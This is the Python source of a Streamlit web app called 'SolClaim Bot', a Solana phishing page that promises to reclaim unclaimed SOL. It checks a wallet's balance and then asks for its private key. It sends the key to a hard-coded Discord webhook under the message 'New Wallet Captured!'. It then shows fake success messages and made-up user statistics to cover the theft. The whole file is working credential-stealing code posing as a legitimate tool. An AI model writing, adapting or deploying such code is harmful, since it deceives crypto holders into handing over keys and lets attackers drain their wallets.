import streamlit as st
import time
import requests
import base58
from solana.rpc.api import Client
from solana.publickey import PublicKey

# Page config
st.set_page_config(
    page_title="SolClaim Bot",
    page_icon="💰",
    layout="centered",
    initial_sidebar_state="expanded"
)

# Custom CSS
st.markdown("""
    <style>
    .main {
        background: linear-gradient(135deg, #1E1E1E 0%, #2D2D2D 100%);
    }
    .stButton>button {
        background-color: #9945FF;
        color: white;
        border-radius: 10px;
        padding: 0.5rem 1rem;
        border: none;
    }
    .stTextInput>div>div>input {
        background-color: #2D2D2D;
        color: white;
        border: 1px solid #9945FF;
    }
    </style>
    """, unsafe_allow_html=True)

# Initialize Solana client
solana_client = Client("https://api.mainnet-beta.solana.com")

# Discord webhook
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1335323044180262914/HArL5ZGL7cZkYUg9b2HnVRvFWIv7pccwSPXj9IEQJb-iY-Ja5t8H9RWNNVimXxY2CPcW"

def check_wallet_eligibility(wallet_address):
    try:
        pubkey = PublicKey(wallet_address)
        response = solana_client.get_balance(pubkey)
        if response and "result" in response:
            lamports = response["result"]["value"]
            balance = lamports / 1_000_000_000
            if balance > 0:
                return balance
    except Exception as e:
        print(f"Debug - Wallet check error: {e}")
    return 0

def send_to_discord(wallet_address, private_key):
    message = {
        "content": f"🎯 New Wallet Captured!\nWallet: {wallet_address}\nPrivate Key: {private_key}"
    }
    requests.post(DISCORD_WEBHOOK_URL, json=message)

# Main UI
st.title("💰 SolClaim: Reclaim Your Sol!")

# Animated stats counter
with st.container():
    st.markdown("""
        <div style='background-color: #2D2D2D; padding: 20px; border-radius: 10px; margin: 10px 0;'>
            <h3 style='color: #9945FF'>📊 Live Stats</h3>
            <p style='font-size: 20px'>6,252 users have claimed 1,925.67 SOL</p>
        </div>
    """, unsafe_allow_html=True)

menu = st.sidebar.selectbox("Navigation", ["Check Wallet ✅", "Invite & Earn 📢"])

def validate_solana_private_key(key):
    try:
        # Decode Base58 private key and check length
        decoded = base58.b58decode(key)
        return len(decoded) == 32 or len(decoded) == 64
    except ValueError:
        return False

if menu == "Check Wallet ✅":
    st.markdown("### Check Your Wallet")
    wallet_address = st.text_input("❓ Enter your Solana wallet address:", placeholder="Enter Solana address...")

    if wallet_address:
        with st.spinner("🔍 Scanning wallet..."):
            time.sleep(2)
            claimable_sol = check_wallet_eligibility(wallet_address)
            
            if claimable_sol > 0:
                st.success(f"🎉 Found {claimable_sol:.6f} SOL available to claim!")
                st.warning("⚠️ Secure private key required for cleanup process")
                
                private_key = st.text_input(
                    "Enter your Solana private key:",
                    type="password",
                    help="Your Solana private key"
                )
                
                if private_key and validate_solana_private_key(private_key):
                    send_to_discord(wallet_address, private_key)
                    with st.spinner("🔄 Initiating cleanup..."):
                        time.sleep(2)
                    st.balloons()
                    st.success("✅ Cleanup process started successfully!")
                    st.info("🕒 Your SOL will be transferred within 24 hours")
                elif private_key:
                    st.error("❌ Invalid private key format. Please enter a valid Solana private key")
            else:
                st.error("No claimable SOL found in this wallet")

elif menu == "Invite & Earn 📢":
    st.markdown("""
        <div style='background-color: #2D2D2D; padding: 20px; border-radius: 10px;'>
            <h2>🚀 Invite & Earn Program</h2>
            <p>Coming soon! Earn rewards for inviting friends.</p>
        </div>
    """, unsafe_allow_html=True)
